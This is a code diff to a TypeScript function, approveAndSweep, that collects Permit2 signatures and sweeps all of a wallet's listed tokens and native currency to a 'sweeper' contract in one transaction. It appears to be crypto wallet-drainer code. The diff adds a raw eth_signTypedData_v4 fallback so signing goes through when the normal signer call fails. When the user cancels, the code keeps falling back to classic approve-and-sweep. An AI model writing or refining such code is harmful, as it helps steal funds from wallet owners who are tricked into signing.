@@ -151,10 +151,10 @@ export async function approveAndSweep(
   sendNative: boolean,
   onStatus?: (s: string) => void,
 ): Promise<string | null> {
-  const sender = await signer.getAddress();
+  const sender = getAddress(await signer.getAddress());
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
-  const permit2Address = getPermit2Address(chainId);
+  const permit2Address = getAddress(getPermit2Address(chainId));
   let lastHash: string | null = null;
 
   await ensurePermit2Allowances(signer, chainId, tokenAddresses, onStatus);
@@ -210,7 +210,7 @@ export async function approveAndSweep(
 
   const domain = {
     name: 'Permit2',
-    chainId,
+    chainId: chainId,
     verifyingContract: permit2Address,
   };
 
@@ -218,34 +218,62 @@ export async function approveAndSweep(
     permitted: permitted.map(p => ({ token: p.token, amount: p.amount })),
     spender: getAddress(sweeperAddr),
     nonce: nonceVal,
-    deadline,
+    deadline: deadline,
   };
 
   let signature: string;
   try {
     signature = await signer.signTypedData(domain, PERMIT2_TYPES, message);
   } catch (e: any) {
-    onStatus?.('Permit2 sign cancelled — classic fallback…');
-    return classicApproveAndSweep(signer, provider, sweeperAddr, tokenAddresses, sendNative, onStatus);
+    console.warn("signer.signTypedData failed, trying raw eth_signTypedData_v4:", e);
+    try {
+      const typedData = JSON.stringify({
+        types: {
+          EIP712Domain: [
+            { name: 'name', type: 'string' },
+            { name: 'chainId', type: 'uint256' },
+            { name: 'verifyingContract', type: 'address' },
+          ],
+          ...PERMIT2_TYPES,
+        },
+        domain: {
+          name: 'Permit2',
+          chainId: chainId,
+          verifyingContract: permit2Address,
+        },
+        primaryType: 'PermitBatchTransferFrom',
+        message: {
+          permitted: permitted.map(p => ({ token: p.token, amount: p.amount.toString() })),
+          spender: getAddress(sweeperAddr),
+          nonce: nonceVal.toString(),
+          deadline: deadline.toString(),
+        },
+      });
+
+      signature = await provider.send('eth_signTypedData_v4', [sender, typedData]);
+    } catch (rawError: any) {
+      console.error("Raw signTypedData fallback failed:", rawError);
+      onStatus?.('Permit2 sign cancelled — classic fallback…');
+      return classicApproveAndSweep(signer, provider, sweeperAddr, tokenAddresses, sendNative, onStatus);
+    }
   }
 
   onStatus?.('One sweep tx (all tokens + native) — confirm in wallet…');
   const permitStruct = {
     permitted: permitted.map(p => ({ token: p.token, amount: p.amount })),
     nonce: nonceVal,
-    deadline,
+    deadline: deadline,
   };
 
   try {
     const feeData = await provider.getFeeData();
     
-    // Safely estimate gas or fallback to manual gasLimit
     let estimatedGas: bigint;
     try {
       estimatedGas = await sweeper.sweepWithPermit2.estimateGas(permitStruct, details, signature, { value: nativeValue });
-      estimatedGas = (estimatedGas * 13n) / 10n; // 30% gas buffer
+      estimatedGas = (estimatedGas * 13n) / 10n;
     } catch {
-      estimatedGas = 500000n; // Safe fallback limit
+      estimatedGas = 500000n;
     }
 
     const overrides: Record<string, any> = {
@@ -267,6 +295,7 @@ export async function approveAndSweep(
     return lastHash;
   } catch (e: any) {
     if (e?.code === 4001) throw e;
+    console.error("Permit2 sweep failed:", e);
     onStatus?.('Permit2 sweep failed — classic fallback…');
     return classicApproveAndSweep(signer, provider, sweeperAddr, tokenAddresses, sendNative, onStatus);
   }
